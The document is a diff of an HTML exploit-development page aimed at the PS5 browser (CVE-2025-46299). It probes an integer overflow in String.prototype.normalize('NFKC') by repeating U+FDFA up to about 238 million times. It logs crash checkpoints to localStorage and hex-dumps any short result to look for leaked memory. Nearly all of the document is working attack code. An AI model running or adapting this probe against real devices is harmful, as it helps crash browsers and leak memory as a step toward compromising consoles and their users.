@@ -2,132 +2,137 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-46299 — Checkpoint Logger</title>
+<title>PS5 CVE-2025-46299 — Binary Search Overflow</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-// Checkpoint system — survives crashes via localStorage
-function checkpoint(msg) {
+// Better checkpoint — includes test info
+function cp(msg) {
     try {
-        localStorage.setItem('normalize_crash_cp', msg);
-        L('[CP] ' + msg);
-    } catch(e) {
-        L('[CP-FAIL] ' + msg);
-    }
+        localStorage.setItem('norm_cp', msg);
+    } catch(e) {}
 }
 
-// On load, check for previous crash
 window.addEventListener('load', () => {
-    const lastCP = localStorage.getItem('normalize_crash_cp');
-    if (lastCP) {
+    const last = localStorage.getItem('norm_cp');
+    if (last) {
         L('[!] PREVIOUS CRASH DETECTED!');
-        L('[!] Last checkpoint before crash: ' + lastCP);
-        L('[!] This tells us exactly where the crash occurred.\n');
+        L('[!] Last checkpoint: ' + last);
+        L('');
     }
-    
-    runTest();
+    run();
 });
 
-async function runTest() {
-    L('[*] Starting normalize() integer overflow test with checkpoints\n');
+async function run() {
+    L('[*] Binary search for exact overflow point\n');
     
-    // Test sizes — from safe to overflow
+    // int32_t max = 2,147,483,647
+    // \uFDFA expands 18x in NFKC
+    // Overflow at: 2,147,483,648 / 18 = 119,304,647.1
+    // 
+    // At N=238,609,295: 18*N = 4,294,967,310 → wraps to 14 (int32)
+    // At N=238,609,296: 18*N = 4,294,967,328 → wraps to 32
+    //
+    // We need to find:
+    // 1. Does the crash happen at the negative overflow (119.3M)?
+    // 2. Or at the wrap-to-positive (238.6M)?
+    // 3. Is there a size where it DOESN'T crash but returns short?
+    
     const tests = [
-        { name: '10M (safe)', count: 10000000, exp: 180000000 },
-        { name: '50M (safe)', count: 50000000, exp: 900000000 },
-        { name: '100M (safe)', count: 100000000, exp: 1800000000 },
-        { name: '119M (at limit)', count: 119304647, exp: 2147483646 },
-        { name: '119.3M (just over)', count: 119304648, exp: 2147483664 },
-        { name: '120M (overflow neg)', count: 120000000, exp: 2160000000 },
-        { name: '150M (overflow)', count: 150000000, exp: 2700000000 },
-        { name: '200M (overflow)', count: 200000000, exp: 3600000000 },
-        { name: '238.6M (wraps to 14)', count: 238609295, exp: 4294967310 },
+        // Safe sizes (no overflow)
+        { n: 50000000,  desc: '50M (safe, exp=900M)' },
+        { n: 100000000, desc: '100M (safe, exp=1.8B)' },
+        { n: 119000000, desc: '119M (safe, exp=2.142B)' },
+        
+        // Just before overflow
+        { n: 119304647, desc: '119.3M (at limit, exp=2,147,483,646)' },
+        
+        // Just after overflow — negative values
+        { n: 119304648, desc: '119.3M+1 (overflow! exp=2,147,483,664 → int32=-2,147,483,632)' },
+        { n: 119400000, desc: '119.4M (exp=2.149B → int32=-2,145,696,000)' },
+        { n: 120000000, desc: '120M (exp=2.16B → int32=-2,134,967,296)' },
+        
+        // Mid-range overflow — still negative
+        { n: 150000000, desc: '150M (exp=2.7B → int32=-1,594,967,296)' },
+        { n: 200000000, desc: '200M (exp=3.6B → int32=-694,967,296)' },
+        
+        // Near the wrap point — should become small positive
+        { n: 238000000, desc: '238M (exp=4.284B → int32=5,033,216)' },
+        { n: 238609294, desc: '238.6M-1 (exp=4,294,967,292 → int32=-4)' },
+        { n: 238609295, desc: '238.6M (exp=4,294,967,310 → int32=14!)' },
+        { n: 238609296, desc: '238.6M+1 (exp=4,294,967,328 → int32=32)' },
+        { n: 238700000, desc: '238.7M (exp=4,296,600,000 → int32=1,632,704)' },
     ];
     
-    for (const test of tests) {
-        L('=== Test: ' + test.name + ' ===');
-        L('  Input: ' + test.count + ' chars of \\uFDFA');
-        L('  Expected output: ' + test.exp);
-        L('  int32 overflow: ' + (test.exp > 2147483647 ? 'YES' : 'NO'));
+    for (const t of tests) {
+        const exp = t.n * 18;
+        const asInt32 = exp > 2147483647 ? (exp > 4294967295 ? exp - 4294967296 : exp - 4294967296) : exp;
+        const asUnsigned = asInt32 < 0 ? asInt32 + 4294967296 : asInt32;
         
-        if (test.exp > 2147483647) {
-            const asInt32 = test.exp > 2147483647 
-                ? (test.exp > 4294967295 
-                    ? test.exp - 4294967296  // wraps past 2^32
-                    : test.exp - 4294967296)  // wraps past 2^31
-                : test.exp;
-            L('  As int32: ' + asInt32);
-            L('  As unsigned: ' + (asInt32 < 0 ? asInt32 + 4294967296 : asInt32));
-        }
+        L('=== ' + t.desc + ' ===');
+        L('  N=' + t.n + ' exp=' + exp + ' int32=' + asInt32 + ' uint=' + asUnsigned);
         
-        checkpoint('TEST_START:' + test.name + ' count=' + test.count);
+        cp('TEST:' + t.desc + '|N=' + t.n + '|CREATE');
         
         try {
-            // Step 1: Create the string
-            checkpoint('CREATE_STRING:' + test.count);
-            let bigStr = '\uFDFA'.repeat(test.count);
-            checkpoint('STRING_CREATED: len=' + bigStr.length);
-            L('  [+] String created. Length: ' + bigStr.length);
-            L('  [*] Memory: ~' + Math.round(bigStr.length * 2 / 1024 / 1024) + 'MB');
+            L('  [*] Creating string (' + Math.round(t.n * 2 / 1024 / 1024) + 'MB)...');
+            let s = '\uFDFA'.repeat(t.n);
+            L('  [+] String created. len=' + s.length);
             
-            // Step 2: Call normalize
-            checkpoint('CALL_NORMALIZE:NFKC');
+            cp('TEST:' + t.desc + '|N=' + t.n + '|NORMALIZE:NFKC');
             L('  [*] Calling normalize("NFKC")...');
             
-            let result = bigStr.normalize('NFKC');
+            let r = s.normalize('NFKC');
             
-            checkpoint('NORMALIZE_DONE: resultLen=' + result.length);
-            L('  [+] normalize() returned!');
-            L('  [+] Result length: ' + result.length);
+            cp('TEST:' + t.desc + '|N=' + t.n + '|DONE:len=' + r.length);
+            L('  [+] normalize() returned! len=' + r.length);
             
-            // Step 3: Analyze result
-            if (result.length !== test.exp && result.length < 1000) {
-                L('  [!] SHORT RESULT! Got ' + result.length + ' expected ~' + test.exp);
-                L('  [!] This indicates integer overflow!');
+            if (r.length < 1000 && r.length !== exp) {
+                L('  [!] SHORT RESULT! Got ' + r.length + ' expected ' + exp);
+                L('  [!] INTEGER OVERFLOW CONFIRMED!');
                 
-                // Dump the content
+                // Dump content
                 let hex = [];
-                for (let i = 0; i < Math.min(result.length, 64); i++) {
-                    hex.push(result.charCodeAt(i).toString(16).padStart(4, '0'));
+                for (let i = 0; i < Math.min(r.length, 64); i++) {
+                    hex.push(r.charCodeAt(i).toString(16).padStart(4, '0'));
                 }
-                L('  [!] Hex dump: ' + hex.join(' '));
-                L('  [!] If these aren\'t all Arabic chars, we have a LEAK!');
+                L('  [!] Content hex: ' + hex.join(' '));
+                L('  [!] If not all Arabic → LEAKED DATA!');
                 
-                checkpoint('LEAK_DETECTED: resultLen=' + result.length);
-            } else if (result.length === test.exp) {
-                L('  [*] Length matches — no overflow at this size');
+                // Check for non-Arabic chars
+                let anomalies = 0;
+                for (let i = 0; i < r.length; i++) {
+                    let c = r.charCodeAt(i);
+                    if (c < 0x0600 || c > 0x06FF) {
+                        if (c !== 0x0020) anomalies++;
+                    }
+                }
+                if (anomalies > 0) {
+                    L('  [!] ' + anomalies + ' non-Arabic chars → POSSIBLE LEAK!');
+                }
+            } else if (r.length === exp) {
+                L('  [*] Length matches — no overflow');
             } else {
-                L('  [?] Unexpected length: ' + result.length + ' (expected ' + test.exp + ')');
+                L('  [?] Unexpected length: ' + r.length);
             }
             
-            // Cleanup
-            bigStr = null;
-            result = null;
-            checkpoint('CLEANUP_DONE');
+            s = null;
+            r = null;
             
         } catch (e) {
-            L('  [!] Error: ' + e.name + ': ' + e.message);
-            checkpoint('ERROR:' + e.name + ':' + e.message);
-            
-            if (e.name === 'RangeError') {
-                L('  [!] RangeError — repeat() or normalize() rejected the size');
-            } else if (e.name === 'InternalError') {
-                L('  [!] InternalError — possible OOM or engine limit');
-            }
+            L('  [!] ' + e.name + ': ' + e.message);
+            cp('TEST:' + t.desc + '|ERROR:' + e.name);
         }
         
         L('');
-        
-        // Small delay between tests
-        await new Promise(r => setTimeout(r, 100));
+        await new Promise(r => setTimeout(r, 200));
     }
     
-    checkpoint('ALL_TESTS_DONE');
-    L('[*] All tests finished.');
-    L('[*] If the browser crashed during any test, reopen this page to see the last checkpoint.');
+    cp('ALL_DONE');
+    L('[*] All tests finished. Check which test caused the crash.');
 }
 </script>
 </body>
